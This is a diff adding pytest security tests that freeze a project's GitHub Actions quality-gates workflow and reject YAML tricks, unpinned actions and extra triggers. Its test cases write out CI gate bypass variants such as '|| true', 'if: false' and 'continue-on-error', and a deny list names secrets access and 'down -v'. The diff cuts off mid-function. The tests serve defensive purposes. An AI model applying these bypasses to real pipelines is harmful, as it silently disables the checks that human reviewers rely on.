@@ -4,12 +4,14 @@ import ast
 import json
 import re
 import subprocess
+import textwrap
 import tomllib
 from dataclasses import fields
 from pathlib import Path
 from typing import Any, cast, get_type_hints
 
 import pytest
+import yaml
 from contract_fixtures import UTC_LATER, UTC_NOW, fixed_id, human_principal
 from curios_contracts import (
     APPROVAL_OUTCOME_VALUES,
@@ -42,10 +44,14 @@ from curios_contracts import (
     to_json_compatible,
 )
 from curios_core import CoreContext, CoreServices
+from yaml.constructor import ConstructorError
+from yaml.events import AliasEvent
+from yaml.nodes import MappingNode
 
 REPO_ROOT = Path(__file__).resolve().parents[2]
 CONTRACTS_SOURCE = REPO_ROOT / "packages/python/curios_contracts/src/curios_contracts"
 CORE_SOURCE = REPO_ROOT / "packages/python/curios_core/src/curios_core"
+QUALITY_GATES_WORKFLOW = REPO_ROOT / ".github/workflows/quality-gates.yml"
 LOCAL_DOCKER_ENV_EXAMPLE = REPO_ROOT / "infrastructure/local/docker/.env.example"
 ROOT_PACKAGE_FILES = (
     REPO_ROOT / "package.json",
@@ -75,6 +81,7 @@ CREDENTIAL_URL_RE = re.compile(r"://[^/\s:@]+(?::[^/\s@]*)?@")
 SECRET_FIELD_TOKEN_RE = re.compile(
     r"(?i)(api[_-]?key|authorization|client[_-]?secret|credential|password|private[_-]?key|secret|session|token|access[_-]?token|cookie)"
 )
+ACTION_FULL_SHA_REF_RE = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@[0-9a-f]{40}$")
 PROHIBITED_SECRET_VALUE_FIELDS = frozenset(
     {
         "access_token",
@@ -238,6 +245,171 @@ AUTHORIZED_GITHUB_PATHS = frozenset(
         ".github/workflows/quality-gates.yml",
     }
 )
+AUTHORIZED_WORKFLOW_PERMISSIONS = {"contents": "read"}
+AUTHORIZED_WORKFLOW_TRIGGERS = {
+    "push": {"branches": ["**"]},
+    "pull_request": "",
+}
+M0_INTEGRATION_GATE_COMMAND = (
+    "uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q"
+)
+AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS = frozenset({"name", "on", "permissions", "jobs"})
+EXPECTED_QUALITY_GATES_WORKFLOW = {
+    "name": "Quality Gates",
+    "on": AUTHORIZED_WORKFLOW_TRIGGERS,
+    "permissions": AUTHORIZED_WORKFLOW_PERMISSIONS,
+    "jobs": {
+        "python": {
+            "name": "Python, Backend, Providers, Integration",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "45",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {
+                    "name": "Set up Python",
+                    "uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+                    "with": {"python-version": "3.14"},
+                },
+                {
+                    "name": "Set up uv",
+                    "uses": "astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9",
+                },
+                {
+                    "name": "Validate TOML manifests",
+                    "run": """
+                    python - <<'PY'
+                    from pathlib import Path
+                    import tomllib
+
+                    for path in sorted(Path(".").rglob("pyproject.toml")):
+                        tomllib.loads(path.read_text(encoding="utf-8"))
+                    PY
+                    """,
+                },
+                {"name": "Check uv lock consistency", "run": "uv lock --check"},
+                {
+                    "name": "Install locked Python workspace",
+                    "run": "uv sync --locked --all-groups --all-packages",
+                },
+                {
+                    "name": "Validate LOCAL_DOCKER PostgreSQL compose config",
+                    "run": """
+                    docker compose
+                    --env-file infrastructure/local/docker/.env.example
+                    -f infrastructure/local/docker/compose.yaml
+                    config --quiet
+                    """,
+                },
+                {"name": "Ruff lint", "run": "uv run ruff check ."},
+                {"name": "Ruff format check", "run": "uv run ruff format --check ."},
+                {
+                    "name": "mypy strict baseline",
+                    "run": "uv run mypy apps/api/src packages/python/*/src",
+                },
+                {
+                    "name": "Package-local Python tests",
+                    "run": """
+                    uv run pytest
+                    apps/api/tests
+                    packages/python/curios_contracts/tests
+                    packages/python/curios_core/tests
+                    packages/python/curios_config/tests
+                    packages/python/curios_postgres_provider/tests
+                    packages/python/curios_ollama/tests
+                    packages/python/curios_observability/tests
+                    -q
+                    """,
+                },
+                {
+                    "name": "M0 runtime, persistence, and policy package tests",
+                    "run": """
+                    uv run pytest
+                    packages/python/curios_persistence/tests
+                    packages/python/curios_policy/tests
+                    packages/python/curios_runtime/tests
+                    -m "not integration"
+                    -q
+                    """,
+                },
+                {
+                    "name": "Repository contract and schema tests",
+                    "run": "uv run pytest tests/contract tests/schema -q",
+                },
+                {"name": "Architecture tests", "run": "uv run pytest tests/architecture -q"},
+                {"name": "Security tests", "run": "uv run pytest tests/security -q"},
+                {
+                    "name": "API integration tests",
+                    "run": "uv run pytest tests/integration/test_api_integration.py -q",
+                },
+                {
+                    "name": "PostgreSQL provider integration test",
+                    "run": (
+                        "uv run pytest tests/integration/test_postgres_provider_integration.py -q"
+                    ),
+                },
+                {
+                    "name": "M0 PostgreSQL integration tests",
+                    "run": """
+                    uv run pytest
+                    packages/python/curios_persistence/tests/test_postgres_persistence_integration.py
+                    packages/python/curios_runtime/tests/test_postgres_event_evidence_store_integration.py
+                    packages/python/curios_runtime/tests/test_postgres_work_repository_integration.py
+                    -q
+                    """,
+                },
+                {"name": "M0 integration tests", "run": M0_INTEGRATION_GATE_COMMAND},
+                {"name": "BOOT acceptance tests", "run": "uv run pytest tests/acceptance -q"},
+                {"name": "Full pytest suite", "run": "uv run pytest -q"},
+            ),
+        },
+        "frontend": {
+            "name": "Frontend",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "15",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {
+                    "name": "Set up Node.js",
+                    "uses": "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
+                    "with": {"node-version": "24"},
+                },
+                {
+                    "name": "Enable pinned pnpm",
+                    "run": """
+                    corepack enable
+                    corepack prepare pnpm@12.5.1 --activate
+                    """,
+                },
+                {
+                    "name": "Install locked Node workspace",
+                    "run": "pnpm install --frozen-lockfile",
+                },
+                {"name": "Repository frontend checks", "run": "pnpm check"},
+                {"name": "apps/web tests", "run": "pnpm --dir apps/web test"},
+                {"name": "apps/web typecheck", "run": "pnpm --dir apps/web typecheck"},
+                {"name": "apps/web production build", "run": "pnpm --dir apps/web build"},
+            ),
+        },
+        "repository": {
+            "name": "Repository Hygiene",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "5",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {"name": "Diff whitespace", "run": "git diff --check"},
+            ),
+        },
+    },
+}
 ALLOWED_TOP_LEVEL_PATHS = frozenset(
     {
         ".github",
@@ -261,6 +433,48 @@ ALLOWED_TOP_LEVEL_PATHS = frozenset(
         "tsconfig.json",
         "uv.lock",
     }
+)
+
+
+class _QualityGateWorkflowLoader(yaml.BaseLoader):
+    """Fail-closed YAML loader for security-sensitive workflow audits."""
+
+
+def _construct_workflow_mapping(
+    loader: _QualityGateWorkflowLoader, node: yaml.nodes.Node, deep: bool = False
+) -> dict[object, object]:
+    if not isinstance(node, MappingNode):
+        raise ConstructorError(
+            "while constructing a workflow mapping",
+            node.start_mark,
+            f"expected a mapping node, got {node.id}",
+            node.start_mark,
+        )
+
+    mapping: dict[object, object] = {}
+    for key_node, value_node in node.value:
+        key = loader.construct_object(key_node, deep=deep)
+        if key == "<<":
+            raise ConstructorError(
+                "while constructing a workflow mapping",
+                node.start_mark,
+                "YAML merge keys are not authorized in the quality-gates workflow",
+                key_node.start_mark,
+            )
+        if key in mapping:
+            raise ConstructorError(
+                "while constructing a workflow mapping",
+                node.start_mark,
+                f"duplicate YAML mapping key is not authorized: {key!r}",
+                key_node.start_mark,
+            )
+        mapping[key] = loader.construct_object(value_node, deep=deep)
+    return mapping
+
+
+_QualityGateWorkflowLoader.add_constructor(
+    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG,
+    _construct_workflow_mapping,
 )
 ALLOWED_APP_ROOTS = frozenset(
     {
@@ -701,6 +915,220 @@ def _tracked_github_paths() -> frozenset[str]:
     )
 
 
+def _quality_gates_workflow_text() -> str:
+    return QUALITY_GATES_WORKFLOW.read_text(encoding="utf-8")
+
+
+def _normalized_workflow_text() -> str:
+    return re.sub(r"\s+", " ", _quality_gates_workflow_text())
+
+
+def _workflow_action_refs() -> tuple[str, ...]:
+    refs: list[str] = []
+    for line in _quality_gates_workflow_text().splitlines():
+        stripped = line.strip()
+        if stripped.startswith("uses: "):
+            refs.append(stripped.removeprefix("uses: ").split("#", maxsplit=1)[0].strip())
+    return tuple(refs)
+
+
+def _reject_workflow_yaml_anchors_and_aliases(workflow_text: str) -> None:
+    for event in yaml.parse(workflow_text, Loader=_QualityGateWorkflowLoader):
+        if isinstance(event, AliasEvent):
+            msg = "YAML aliases are not authorized in the quality-gates workflow"
+            raise AssertionError(msg)
+        if getattr(event, "anchor", None) is not None:
+            msg = "YAML anchors are not authorized in the quality-gates workflow"
+            raise AssertionError(msg)
+
+
+def _parse_quality_gate_workflow(workflow_text: str) -> dict[str, object]:
+    try:
+        _reject_workflow_yaml_anchors_and_aliases(workflow_text)
+        parsed = yaml.load(workflow_text, Loader=_QualityGateWorkflowLoader)
+    except yaml.YAMLError as exc:
+        msg = f"quality-gates workflow YAML is not authorized: {exc}"
+        raise AssertionError(msg) from exc
+    if not isinstance(parsed, dict):
+        msg = "quality-gates workflow YAML must parse to a mapping"
+        raise AssertionError(msg)
+    return cast(dict[str, object], parsed)
+
+
+def _workflow_permission_violations(workflow: dict[str, object]) -> tuple[str, ...]:
+    violations: list[str] = []
+
+    permissions = workflow.get("permissions")
+    if permissions != AUTHORIZED_WORKFLOW_PERMISSIONS:
+        violations.append(
+            "workflow permissions must be exactly "
+            f"{AUTHORIZED_WORKFLOW_PERMISSIONS!r}; got {permissions!r}"
+        )
+
+    jobs = workflow.get("jobs")
+    if not isinstance(jobs, dict):
+        violations.append(f"jobs must be a mapping; got {jobs!r}")
+        return tuple(violations)
+
+    for job_name, job_config in jobs.items():
+        if not isinstance(job_config, dict):
+            violations.append(f"job {job_name!r} must be a mapping; got {job_config!r}")
+            continue
+        if "permissions" in job_config:
+            violations.append(
+                f"job-level permissions are not authorized: {job_name!r} -> "
+                f"{job_config['permissions']!r}"
+            )
+
+    return tuple(violations)
+
+
+def _workflow_trigger_violations(workflow: dict[str, object]) -> tuple[str, ...]:
+    triggers = workflow.get("on")
+    if triggers != AUTHORIZED_WORKFLOW_TRIGGERS:
+        return (
+            f"workflow triggers must be exactly {AUTHORIZED_WORKFLOW_TRIGGERS!r}; got {triggers!r}",
+        )
+    return ()
+
+
+def _normalized_workflow_run(run: object) -> str | None:
+    if not isinstance(run, str):
+        return None
+    return " ".join(run.split())
+
+
+def _workflow_step_violations(
+    job_name: str,
+    step_index: int,
+    step: object,
+    expected_step: dict[str, object],
+) -> tuple[str, ...]:
+    if not isinstance(step, dict):
+        return (f"job {job_name!r} step {step_index} must be a mapping; got {step!r}",)
+
+    violations: list[str] = []
+    expected_keys = frozenset(expected_step)
+    actual_keys = frozenset(step)
+    if actual_keys != expected_keys:
+        violations.append(
+            f"job {job_name!r} step {step_index} keys changed: "
+            f"expected {sorted(expected_keys)!r}; got {sorted(actual_keys)!r}"
+        )
+
+    expected_name = expected_step["name"]
+    if step.get("name") != expected_name:
+        violations.append(
+            f"job {job_name!r} step {step_index} name changed: "
+            f"expected {expected_name!r}; got {step.get('name')!r}"
+        )
+
+    if "uses" in expected_step and step.get("uses") != expected_step["uses"]:
+        violations.append(
+            f"job {job_name!r} step {expected_name!r} action changed: "
+            f"expected {expected_step['uses']!r}; got {step.get('uses')!r}"
+        )
+    if "with" in expected_step and step.get("with") != expected_step["with"]:
+        violations.append(
+            f"job {job_name!r} step {expected_name!r} action inputs changed: "
+            f"expected {expected_step['with']!r}; got {step.get('with')!r}"
+        )
+    if "run" in expected_step:
+        expected_run = _normalized_workflow_run(textwrap.dedent(cast(str, expected_step["run"])))
+        actual_run = _normalized_workflow_run(step.get("run"))
+        if actual_run != expected_run:
+            violations.append(
+                f"job {job_name!r} step {expected_name!r} run changed: "
+                f"expected {expected_run!r}; got {actual_run!r}"
+            )
+
+    return tuple(violations)
+
+
+def _workflow_required_gate_violations(workflow: dict[str, object]) -> tuple[str, ...]:
+    violations: list[str] = []
+
+    actual_top_level_keys = frozenset(workflow)
+    if actual_top_level_keys != AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS:
+        violations.append(
+            "workflow top-level keys changed: expected "
+            f"{sorted(AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS)!r}; got "
+            f"{sorted(actual_top_level_keys)!r}"
+        )
+    for key in ("name", "on", "permissions"):
+        if workflow.get(key) != EXPECTED_QUALITY_GATES_WORKFLOW[key]:
+            violations.append(
+                f"workflow {key!r} changed: expected "
+                f"{EXPECTED_QUALITY_GATES_WORKFLOW[key]!r}; got {workflow.get(key)!r}"
+            )
+
+    jobs = workflow.get("jobs")
+    if not isinstance(jobs, dict):
+        return (f"jobs must be a mapping; got {jobs!r}",)
+
+    expected_jobs = cast(dict[str, dict[str, object]], EXPECTED_QUALITY_GATES_WORKFLOW["jobs"])
+    actual_job_names = frozenset(jobs)
+    expected_job_names = frozenset(expected_jobs)
+    if actual_job_names != expected_job_names:
+        violations.append(
+            f"workflow job set changed: expected {sorted(expected_job_names)!r}; "
+            f"got {sorted(actual_job_names)!r}"
+        )
+
+    for job_name, expected_job in expected_jobs.items():
+        job_config = jobs.get(job_name)
+        if not isinstance(job_config, dict):
+            violations.append(f"required job {job_name!r} must be present as a mapping")
+            continue
+
+        expected_job_keys = frozenset(expected_job)
+        actual_job_keys = frozenset(job_config)
+        if actual_job_keys != expected_job_keys:
+            violations.append(
+                f"job {job_name!r} keys changed: expected {sorted(expected_job_keys)!r}; "
+                f"got {sorted(actual_job_keys)!r}"
+            )
+        for key in ("name", "runs-on", "timeout-minutes"):
+            if job_config.get(key) != expected_job[key]:
+                violations.append(
+                    f"job {job_name!r} {key!r} changed: expected {expected_job[key]!r}; "
+                    f"got {job_config.get(key)!r}"
+                )
+
+        steps = job_config.get("steps")
+        if not isinstance(steps, list):
+            violations.append(f"required job {job_name!r} steps must be a list")
+            continue
+        for step in steps:
+            if not isinstance(step, dict):
+                violations.append(f"required job {job_name!r} has non-mapping step {step!r}")
+            continue
+
+        expected_steps = cast(tuple[dict[str, object], ...], expected_job["steps"])
+        if len(steps) != len(expected_steps):
+            violations.append(
+                f"job {job_name!r} step count changed: expected {len(expected_steps)}; "
+                f"got {len(steps)}"
+            )
+        for step_index, expected_step in enumerate(expected_steps):
+            if step_index >= len(steps):
+                violations.append(f"job {job_name!r} missing step {step_index}")
+                continue
+            violations.extend(
+                _workflow_step_violations(job_name, step_index, steps[step_index], expected_step)
+            )
+
+    return tuple(violations)
+
+
+def _workflow_security_violations(workflow: dict[str, object]) -> tuple[str, ...]:
+    return (
+        *_workflow_permission_violations(workflow),
+        *_workflow_trigger_violations(workflow),
+        *_workflow_required_gate_violations(workflow),
+    )
+
+
 def _tracked_runtime_source_files() -> frozenset[str]:
     runtime_source = REPO_ROOT / "packages/python/curios_runtime/src/curios_runtime"
     return frozenset(
@@ -1103,6 +1531,1625 @@ def test_github_topology_detector_rejects_unauthorized_surfaces(
 
 def test_github_topology_detector_allows_only_task_boot_025_workflow() -> None:
     assert not _unauthorized_github_paths(frozenset({".github/workflows/quality-gates.yml"}))
+
+
+def test_quality_gate_workflow_preserves_boot_security_model_and_runs_m0_gates() -> None:
+    workflow_text = _quality_gates_workflow_text()
+    workflow = _parse_quality_gate_workflow(workflow_text)
+    normalized_workflow = _normalized_workflow_text()
+    action_refs = _workflow_action_refs()
+    permission_violations = _workflow_permission_violations(workflow)
+    trigger_violations = _workflow_trigger_violations(workflow)
+    required_gate_violations = _workflow_required_gate_violations(workflow)
+
+    _assert_no_security_failure(action_refs != (), "quality-gates workflow has no actions")
+    for action_ref in action_refs:
+        _assert_no_security_failure(
+            ACTION_FULL_SHA_REF_RE.fullmatch(action_ref) is not None,
+            f"GitHub action is not pinned to a full immutable SHA: {action_ref}",
+        )
+
+    _assert_no_security_failure(
+        not permission_violations,
+        f"workflow permissions changed: {list(permission_violations)}",
+    )
+    _assert_no_security_failure(
+        not trigger_violations,
+        f"workflow triggers changed: {list(trigger_violations)}",
+    )
+    _assert_no_security_failure(
+        not required_gate_violations,
+        f"workflow required quality gates changed: {list(required_gate_violations)}",
+    )
+    for prohibited in (
+        "release:",
+        "deployment",
+        "environment:",
+        "secrets.",
+        "ollama serve",
+        "docker compose up -d ollama",
+        "down -v",
+    ):
+        _assert_no_security_failure(
+            prohibited not in workflow_text,
+            f"prohibited workflow pattern present: {prohibited}",
+        )
+
+    postgres_provider_index = normalized_workflow.index(
+        "uv run pytest tests/integration/test_postgres_provider_integration.py -q"
+    )
+    m0_postgres_index = normalized_workflow.index(
+        "uv run pytest "
+        "packages/python/curios_persistence/tests/test_postgres_persistence_integration.py"
+    )
+    m0_integration_index = normalized_workflow.index(
+        "uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q"
+    )
+    boot_acceptance_index = normalized_workflow.index("uv run pytest tests/acceptance -q")
+    full_pytest_index = normalized_workflow.index("uv run pytest -q")
+    _assert_no_security_failure(
+        postgres_provider_index < m0_postgres_index < m0_integration_index,
+        "PostgreSQL and M0 integration tests must run in explicit serial gates",
+    )
+    _assert_no_security_failure(
+        m0_integration_index < boot_acceptance_index < full_pytest_index,
+        "M0 integration must run before acceptance and full pytest",
+    )
+
+
+def _security_violations_for_workflow_text(workflow_text: str) -> tuple[str, ...]:
+    workflow = _parse_quality_gate_workflow(workflow_text)
+    return _workflow_security_violations(workflow)
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "A_current_valid_push_and_pull_request",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+    ),
+)
+def test_quality_gate_trigger_detector_accepts_only_frozen_trigger_model(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+    assert not _workflow_trigger_violations(workflow), case_id
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "B_push_only",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "C_pull_request_only",
+            """
+            name: Quality Gates
+            on:
+              pull_request:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "D_repository_dispatch",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              repository_dispatch:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "E_workflow_run",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              workflow_run:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "F_schedule",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              schedule:
+                - cron: "0 * * * *"
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "G_workflow_dispatch",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              workflow_dispatch:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "H_pull_request_target",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              pull_request_target:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "I_release",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              release:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "J_unknown_trigger",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - "**"
+              pull_request:
+              frobnicate:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "K_missing_on",
+            """
+            name: Quality Gates
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "L_scalar_on",
+            """
+            name: Quality Gates
+            on: push
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "M_sequence_on",
+            """
+            name: Quality Gates
+            on:
+              - push
+              - pull_request
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "wrong_push_branch_filter",
+            """
+            name: Quality Gates
+            on:
+              push:
+                branches:
+                  - main
+              pull_request:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+    ),
+)
+def test_quality_gate_trigger_detector_rejects_non_frozen_trigger_models(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+    assert _workflow_trigger_violations(workflow), case_id
+
+
+@pytest.mark.parametrize(
+    ("case_id", "workflow_text"),
+    (
+        (
+            "N_duplicate_trigger_key",
+            """
+            name: Quality Gates
+            on:
+              push:
+              push:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "O_trigger_supplied_via_anchor_alias",
+            """
+            name: Quality Gates
+            trigger: &trigger
+              push:
+                branches:
+                  - "**"
+              pull_request:
+            on: *trigger
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+        (
+            "O_trigger_supplied_via_merge",
+            """
+            name: Quality Gates
+            on:
+              <<:
+                push:
+                  branches:
+                    - "**"
+                pull_request:
+            permissions:
+              contents: read
+            jobs: {}
+            """,
+        ),
+    ),
+)
+def test_quality_gate_trigger_parser_rejects_ambiguous_trigger_yaml(
+    case_id: str,
+    workflow_text: str,
+) -> None:
+    with pytest.raises(AssertionError):
+        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
+
+
+@pytest.mark.parametrize(
+    ("case_id", "replacement"),
+    (
+        (
+            "B_remove_gate",
+            "",
+        ),
+        (
+            "C_replace_path",
+            "      - name: M0 integration tests\n"
+            "        run: uv run pytest tests/integration/test_m0_other.py -q\n\n",
+        ),
+        (
+            "D_add_if_false",
+            "      - name: M0 integration tests\n"
+            "        if: false\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
+        ),
+        (
+            "E_continue_on_error",
+            "      - name: M0 integration tests\n"
+            "        continue-on-error: true\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
+        ),
+        (
+            "F_prepend_set_plus_e",
+            "      - name: M0 integration tests\n"
+            "        run: |\n"
+            "          set +e\n"
+            f"          {M0_INTEGRATION_GATE_COMMAND}\n\n",
+        ),
+        (
+            "G_append_or_true",
+            "      - name: M0 integration tests\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND} || true\n\n",
+        ),
+        (
+            "H_append_semicolon_true",
+            "      - name: M0 integration tests\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND} ; true\n\n",
+        ),
+        (
+            "I_append_exit_zero",
+            "      - name: M0 integration tests\n"
+            "        run: |\n"
+            f"          {M0_INTEGRATION_GATE_COMMAND}\n"
+            "          exit 0\n\n",
+        ),
+        (
+            "J_wrap_failure_swallowing_shell",
+            "      - name: M0 integration tests\n"
+            "        run: |\n"
+            f"          if ! {M0_INTEGRATION_GATE_COMMAND}; then\n"
+            "            echo ignored\n"
+            "          fi\n\n",
+        ),
+        (
+            "K_unauthorized_conditional_step",
+            "      - name: M0 integration tests\n"
+            "        if: github.event_name == 'workflow_dispatch'\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
+        ),
+        (
+            "L_duplicate_safe_and_bypassed_gate",
+            "      - name: M0 integration tests\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n"
+            "      - name: M0 integration tests\n"
+            "        if: false\n"
+            f"        run: {M0_INTEGRATION_GATE_COMMAND}\n\n",
+        ),
+    ),
+)
+def test_quality_gate_required_m0_integration_step_rejects_bypass_variants(
+    case_id: str,
+    replacement: str,
+) -> None:
+    original = (
+        "      - name: M0 integration tests\n"
+        "        run: uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q\n\n"
+    )
+    workflow_text = _quality_gates_workflow_text().replace(original, replacement)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+def test_quality_gate_required_m0_integration_step_accepts_exact_current_gate() -> None:
+    assert not _security_violations_for_workflow_text(_quality_gates_workflow_text())
+
+
+@pytest.mark.parametrize(
+    ("case_id", "original", "replacement"),
+    (
+        (
+            "repository_dispatch_trigger",
+            "  pull_request:\n",
+            "  pull_request:\n  repository_dispatch:\n",
+        ),
+        (
+            "workflow_run_trigger",
+            "  pull_request:\n",
+            "  pull_request:\n  workflow_run:\n",
+        ),
+        (
+            "schedule_trigger",
+            "  pull_request:\n",
+            '  pull_request:\n  schedule:\n    - cron: "0 * * * *"\n',
+        ),
+        (
+            "workflow_dispatch_trigger",
+            "  pull_request:\n",
+            "  pull_request:\n  workflow_dispatch:\n",
+        ),
+        (
+            "pull_request_target_trigger",
+            "  pull_request:\n",
+            "  pull_request:\n  pull_request_target:\n",
+        ),
+    ),
+)
+def test_quality_gate_workflow_rejects_extra_trigger_mutations(
+    case_id: str,
+    original: str,
+    replacement: str,
+) -> None:
+    workflow_text = _quality_gates_workflow_text().replace(original, replacement)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+@pytest.mark.parametrize(
+    ("case_id", "original", "replacement"),
+    (
+        (
+            "architecture_if_false",
+            "      - name: Architecture tests\n        run: uv run pytest tests/architecture -q\n",
+            "      - name: Architecture tests\n"
+            "        if: false\n"
+            "        run: uv run pytest tests/architecture -q\n",
+        ),
+        (
+            "security_or_true",
+            "      - name: Security tests\n        run: uv run pytest tests/security -q\n",
+            "      - name: Security tests\n        run: uv run pytest tests/security -q || true\n",
+        ),
+        (
+            "boot_acceptance_continue_on_error",
+            "      - name: BOOT acceptance tests\n        run: uv run pytest tests/acceptance -q\n",
+            "      - name: BOOT acceptance tests\n"
+            "        continue-on-error: true\n"
+            "        run: uv run pytest tests/acceptance -q\n",
+        ),
+        (
+            "frontend_tests_exit_zero",
+            "      - name: apps/web tests\n        run: pnpm --dir apps/web test\n",
+            "      - name: apps/web tests\n        run: pnpm --dir apps/web test; exit 0\n",
+        ),
+    ),
+)
+def test_quality_gate_required_steps_reject_representative_bypass_variants(
+    case_id: str,
+    original: str,
+    replacement: str,
+) -> None:
+    workflow_text = _quality_gates_workflow_text().replace(original, replacement)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+@pytest.mark.parametrize(
+    ("case_id", "original", "replacement"),
+    (
+        (
+            "python_job_if_false",
+            "  python:\n    name: Python, Backend, Providers, Integration\n",
+            "  python:\n    if: false\n    name: Python, Backend, Providers, Integration\n",
+        ),
+        (
+            "python_job_continue_on_error",
+            "  python:\n    name: Python, Backend, Providers, Integration\n",
+            "  python:\n"
+            "    continue-on-error: true\n"
+            "    name: Python, Backend, Providers, Integration\n",
+        ),
+        (
+            "frontend_job_defaults",
+            "  frontend:\n    name: Frontend\n",
+            "  frontend:\n    defaults:\n      run:\n        shell: bash {0}\n    name: Frontend\n",
+        ),
+    ),
+)
+def test_quality_gate_required_jobs_reject_bypass_variants(
+    case_id: str,
+    original: str,
+    replacement: str,
+) -> None:
+    workflow_text = _quality_gates_workflow_text().replace(original, replacement)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+def test_quality_gate_workflow_action_pin_detector_rejects_floating_action(
+    tmp_path: Path,
+) -> None:
+    workflow_path = tmp_path / "quality-gates.yml"
+    workflow_path.write_text(
+        _quality_gates_workflow_text().replace(
+            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+            "actions/checkout@v4",
+            1,
+        ),
+        encoding="utf-8",
+    )
+    original_workflow_path = QUALITY_GATES_WORKFLOW
+    try:
+        globals()["QUALITY_GATES_WORKFLOW"] = workflow_path
+        with pytest.raises(AssertionError, match="not pinned to a full immutable SHA"):
+            test_quality_gate_workflow_preserves_boot_security_model_and_runs_m0_gates()
+    finally:
+        globals()["QUALITY_GATES_WORKFLOW"] = original_workflow_path
+
+
+def _workflow_with_python_step_after_m0(step_text: str) -> str:
+    anchor = f"      - name: M0 integration tests\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
+    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")
+
+
+def _workflow_with_frontend_step_after_tests(step_text: str) -> str:
+    anchor = "      - name: apps/web tests\n        run: pnpm --dir apps/web test\n"
+    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")
+
+
+def _workflow_with_job_preamble(job_name: str, preamble: str) -> str:
+    marker = f"  {job_name}:\n"
+    return _quality_gates_workflow_text().replace(marker, f"{marker}{preamble}", 1)
+
+
+def _workflow_with_step_extra(
+    step_name: str,
+    run_line: str,
+    extra: str,
+) -> str:
+    anchor = f"      - name: {step_name}\n        run: {run_line}\n"
+    replacement = f"      - name: {step_name}\n{extra}        run: {run_line}\n"
+    return _quality_gates_workflow_text().replace(
+        anchor,
+        replacement,
+    )
+
+
+def _workflow_execution_surface_mutation(case_id: str) -> str:
+    base = _quality_gates_workflow_text()
+    unknown_sha = "0123456789abcdef0123456789abcdef01234567"
+    mutations = {
+        "A_extra_deploy_job_with_run": lambda: (
